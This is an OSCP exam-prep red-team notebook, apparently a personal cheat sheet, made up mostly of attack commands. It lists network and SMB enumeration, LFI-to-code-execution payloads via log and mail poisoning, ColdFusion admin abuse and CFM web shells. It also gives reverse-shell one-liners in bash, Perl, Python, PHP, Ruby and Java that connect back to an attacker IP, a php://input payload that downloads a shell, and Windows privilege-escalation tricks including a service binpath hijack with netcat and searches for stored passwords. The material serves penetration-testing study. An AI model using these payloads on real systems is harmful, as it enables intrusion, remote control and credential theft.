# redteam-notebook
Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.

## Early Enumeration - generic

### Network wide scan - first steps
`nmap -sn 10.11.1.0/24`

### netbios scan
`nbtscan -r 10.11.1.0/24`

### DNS recon
`dnsrecon -r 10.11.1.0/24 -n <DNS IP>`
  
### Scan specific target with nmap
`nmap -sV -sT -p- <target IP> `
  
### Guess OS using xprobe2
`xprobe2 <target IP>`

### Check Netbios vulns
`nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target`

### Search for SMB vulns
`nmap -p139,445 <target IP> --script smb-vuln*`
  
### Enumerate using SMB (null session)
`enum4linux -a <target IP>`
  
### Enumerate using SMB (w/user & pass)
`enum4linux -a -u <user> -p <passwd> <targetIP>`

## Website Enumeration

### quick enumeration using wordlist
`gobuster -u http://<target IP> -w /usr/share/dirb/wordlists/big.txt`
  
### enumeration and basic vuln scan of a website
`nikto -host http://<target IP>`
  
## Website tips and tricks

### PHP

* Check for LFI

Add `/etc/passwd%00` to any GET/POST arguments. On windows try `C:\Windows\System32\drivers\etc\hosts%00` or `C:\autoexec.bat%00`.
A quick win could also be any of these files `c:\sysprep.inf`, `c:\sysprep\sysprep.xml` or `c:\unattend.xml` as they would contain local admin credentials. On linux it's worth checking `/proc/self/environ` to see if there are any credentials passed to the running process via env vars.

* Fetching .php files via LFI

`/index.php?somevar=php://filter/read=convert.base64-encode/resource=<file path>%00` this will return base64 encoded PHP file. Good for fishing up `config.php` or similar.

* Abusing /proc/self/environ LFI to gain reverse shell
In some situations it's possible to abuse `/proc/self/environ` to execute a command. For example:
`index.php?somevar=/proc/self/environ&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* Apache access.log + LFI = PHP injection
If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.

with netcat send a request like this:
```GET /<?php system($_GET["cmd"]);?>

```

* auth.log + LFI
`ssh <?php system($_GET["cmd"]);?>@targetIP` and then LFI `/var/log/auth.log`

* /var/mail + LFI
`mail -s "<?php system($_GET["cmd"]);?>" someuser@targetIP < /dev/null` 

* php expect
`index.php?somevar=expect://ls`

* php input
`curl -X POST "targetIP/index.php?somevar=php://input" --data '<?php system("curl -o cmd.php yourIP/cmd.txt");?>'`
Then access `targetIP/cmd.php`

### ColdFusion


* is it Enterprise or Community?
Check how it handles `.jsp` files  `curl targetIP/blah/blah.jsp`. If 404 - enterprise, 500 - community.

* which version?
`/CFIDE/adminapi/base.cfc?wsdl` has a useful comment indicating exact version

* common XEE
https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf

* LFI in admin login locale
`/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\lib\password.properties` - may need full path. They can be obtained with help of  `/CFIDE/componentutils/cfexplorer.cfc`

* Local upload and execution
Once access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.

`Debugging & Logging` -> `Scheduled Tasks` -> url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.
  
To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<some URL>, Probe fail - fail if probe does not contain "blahblah", Execute program <path to our downloaded exe>. And then run probe manually.
  
* Files worth grabbing
** CF7 \lib\neo-query.xml
** CF8 \lib\neo-datasource.xml
** CF9 \lib\neo-datasource.xml

* Simple remote CFM shell
```
<html>
<body>
<cfexecute name = "#URL.runme#" arguments =
"#URL.args#" timeout = "20">
</cfexecute>
</body>
</html>
```

* Simple remote shell using Java (if CFEXECUTE is disabled)
```
<cfset runtime = createObject("java",
"java.lang.System")>
<cfset props = runtime.getProperties()>
<cfdump var="#props#">
<cfset env = runtime.getenv()>
<cfdump var="#env#">
```

## Reverse Shell Howto

* Bash
`bash -i >& /dev/tcp/yourIP/4444 0>&1`

* Perl Linux
`perl -e 'use Socket;$i="yourIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

* Perl Windows
`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"yourIP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`


* Python
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("yourIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* PHP
`php -r '$sock=fsockopen("yourIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

* Ruby
`ruby -rsocket -e'f=TCPSocket.open("yourIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

* Java (Linux)
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/yourIP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

* xterm

`xterm -display yourIP:1`

And on your side authorize the connection with `xhost +targetIp` and catch it with `Xnest :1`


## Interactive Shell Howto

* Python (Linux)
`python -c 'import pty; pty.spawn("/bin/bash")' `

* Python (Windows)
`c:\python26\python.exe -c 'import pty; pty.spawn("c:\\windows\\system32\\cmd.exe")' `

## Inside Windows

* Get version
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

* Get users
`net users`

* Get user info
`net user <username>`


* Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)
`netstat -ano`

* Firewall status
`netsh firewall show state`
`netsh firewall show config`

* Scheduled tasks
List - `schtasks /query /fo LIST /v`
Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`
Run - `schtasks /Run /TN mytask`
Delete - `schtasks /Delete /TN mytask`

* Running tasks
List - `tasklist /SVC`
Kill - `taskkill /IM <exe name> /F`
Kill - `taskkill /PID <pid> /F`

* Services
List - `net start`
Long name to key name `sc getkeyname "long name"`
Details - `sc qc <key name>`
Config - `sc config <key name> `

* Low hanging fruits to grab
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

* Installers are running as elevated?
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

* Find interesting files
`dir /s *pass* == *cred* == *vnc* == *.config*`
`findstr /si password *.xml *.ini *.txt`

* Find interesting registry entries
`reg query HKLM /f password /t REG_SZ /s`
`reg query HKCU /f password /t REG_SZ /s`

* Permissions
Check detail on service - `accesschk.exe /accepteula -ucqv <service name>`
Find modifiable services - `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`
                           `accesschk.exe /accepteula -uwcqv "Users" *`
Folder permissions - `accesschk.exe -dqv <path>`
`cacls <path>`
`icacls <path\file`
                           
* Qick win on WinXP SP0/1  
`sc config upnphost binpath= "C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe"`
`sc config upnphost obj= ".\LocalSystem" password= ""`
`sc config upnphost depend= ""`
`net stop upnphost`
`net start upnphost`

* Quick wins
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`
`reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`
`reg query "HKCU\Software\ORL\WinVNC3\Password"`

* Windows specific LPE vulns
- https://www.exploit-db.com/exploits/11199/
- https://www.exploit-db.com/exploits/18176/
- https://www.exploit-db.com/exploits/15609/
- https://www.securityfocus.com/bid/42269/exploit
- https://www.securityfocus.com/bid/46136/exploit



## References
* [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
* [FuzzySecurity](http://www.fuzzysecurity.com) - this is something you must bookmark... period. I found the [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) especially useful.
* [WMIC reference/guide](https://www.computerhope.com/wmic.htm)
* [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) - this is a must have for working on Windows boxes.
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
* [ColdFusion for PenTesters](http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf)
* [ColdFusion Path Traversal](http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/)
* [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) - Good read. Check out other cheat sheets on this page too!
* [fimap](https://github.com/kurobeats/fimap) - LFI/RFI scanner
* [Changeme](https://github.com/ztgrace/changeme) - default password scanner
* [CIRT Default Passwords DB](https://cirt.net/passwords)
* [From LFI to Shell](http://resources.infosecinstitute.com/local-file-inclusion-code-execution)
* [Useful Linux commands](https://highon.coffee/blog/linux-commands-cheat-sheet/)
